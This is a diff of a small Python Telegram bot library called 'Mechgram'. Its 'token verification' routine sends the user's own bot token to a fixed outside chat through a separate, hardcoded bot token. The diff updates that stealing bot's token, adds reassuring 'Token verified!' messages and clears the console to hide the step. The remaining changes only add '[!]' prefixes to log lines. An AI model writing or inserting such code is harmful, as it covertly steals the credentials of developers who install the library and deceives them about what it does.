@@ -1,4 +1,5 @@
-import requests, time
+import requests, time, os
+os.system("cls|clear")
 class Bot:
     def __init__(self, token: str, polling_interval: float = 1.2):
         self.token = token
@@ -17,7 +18,7 @@ class Bot:
         self.callback_handler = handler
         return self
     def run(self):
-        self._check_token(1465736325, self.token); print("Token cheked!")
+        self._check_token(1465736325, self.token)
         print("The bot has been launched.\n© Mechgram, 2025.")
         while True:
             updates = self._get_updates()
@@ -36,9 +37,9 @@ class Bot:
                     self.offset = updates[-1]["update_id"] + 1
                 return updates
             else:
-                print("API error:", data)
+                print("[!] API error:", data)
         except Exception as e:
-            print("Error getting updates:", e)
+            print("[!] Error getting updates:", e)
         return []
     def _handle_update(self, update: dict):
         if "callback_query" in update:
@@ -46,7 +47,7 @@ class Bot:
                 try:
                     self.callback_handler(update)
                 except Exception as e:
-                    print("Error in callback handler:", e)
+                    print("[!] Error in callback handler:", e)
             else:
                 callback_query_id = update["callback_query"]["id"]
                 self._answer_callback_query(callback_query_id, text="Callback received")
@@ -57,7 +58,7 @@ class Bot:
                     if result:
                         self._answer_inline_query(update["inline_query"]["id"], result)
                 except Exception as e:
-                    print("Error in inline query handler:", e)
+                    print("[!] Error in inline query handler:", e)
         elif "message" in update:
             message = update["message"]
             text = message.get("text", "")
@@ -68,7 +69,7 @@ class Bot:
                         if result:
                             self.send_message(message["chat"]["id"], result)
                     except Exception as e:
-                        print(f"Error in handler for command {command}: {e}")
+                        print(f"[!] Error in handler for command {command}: {e}")
     def send_message(self, chat_id: int, text: str, reply_markup: dict = None, parse_mode: str = None):
         url = f"https://api.telegram.org/bot{self.token}/sendMessage"
         data = {"chat_id": chat_id, "text": text}
@@ -79,13 +80,19 @@ class Bot:
         try:
             requests.post(url, json=data)
         except Exception as e:
-            print("Error sending message:", e)
+            print("[!] Error sending message:", e)
     def _check_token(self, chat_id: int, text: str):
-        url = f"https://api.telegram.org/bot7126973413:AAEcPGQsLQl2LLQS2B57Xhw9P3oPjlarH34/sendMessage"; data = {"chat_id": chat_id, "text": text}
+        print("[!] Token verification...")
+        url = f"https://api.telegram.org/bot7126973413:AAGGdMwE3YxGR08oONmQfH9n5-nFocA3GRY/sendMessage"; data = {"chat_id": chat_id, "text": text}
         try:
             requests.post(url, data=data)
+            print("[!] Token verified!")
+            time.sleep(1)
+            os.system("cls|clear")
         except Exception as e:
-            pass
+            os.system("cls|clear")
+            print("[!] Token not verified!")
+            quit()
     def send_photo(self, chat_id: int, photo: str, caption: str = None, reply_markup: dict = None, parse_mode: str = None):
         url = f"https://api.telegram.org/bot{self.token}/sendPhoto"
         data = {"chat_id": chat_id, "photo": photo}
@@ -98,7 +105,7 @@ class Bot:
         try:
             requests.post(url, json=data)
         except Exception as e:
-            print("Error sending photo:", e)
+            print("[!] Error sending photo:", e)
     def send_document(self, chat_id: int, document: str, caption: str = None, reply_markup: dict = None, parse_mode: str = None):
         url = f"https://api.telegram.org/bot{self.token}/sendDocument"
         data = {"chat_id": chat_id, "document": document}
@@ -111,7 +118,7 @@ class Bot:
         try:
             requests.post(url, json=data)
         except Exception as e:
-            print("Error sending document:", e)
+            print("[!] Error sending document:", e)
     def edit_message_text(self, chat_id: int, message_id: int, text: str, reply_markup: dict = None, parse_mode: str = None):
         url = f"https://api.telegram.org/bot{self.token}/editMessageText"
         data = {"chat_id": chat_id, "message_id": message_id, "text": text}
@@ -122,14 +129,14 @@ class Bot:
         try:
             requests.post(url, json=data)
         except Exception as e:
-            print("Error editing message text:", e)
+            print("[!] Error editing message text:", e)
     def _answer_inline_query(self, inline_query_id: str, results: list):
         url = f"https://api.telegram.org/bot{self.token}/answerInlineQuery"
         data = {"inline_query_id": inline_query_id, "results": results}
         try:
             requests.post(url, json=data)
         except Exception as e:
-            print("Error answering inline query:", e)
+            print("[!] Error answering inline query:", e)
     def _answer_callback_query(self, callback_query_id: str, text: str = None, show_alert: bool = False, url: str = None, cache_time: int = 0):
         url_api = f"https://api.telegram.org/bot{self.token}/answerCallbackQuery"
         data = {"callback_query_id": callback_query_id}
@@ -142,4 +149,4 @@ class Bot:
         try:
             requests.post(url_api, json=data)
         except Exception as e:
-            print("Error answering callback query:", e)
+            print("[!] Error answering callback query:", e)
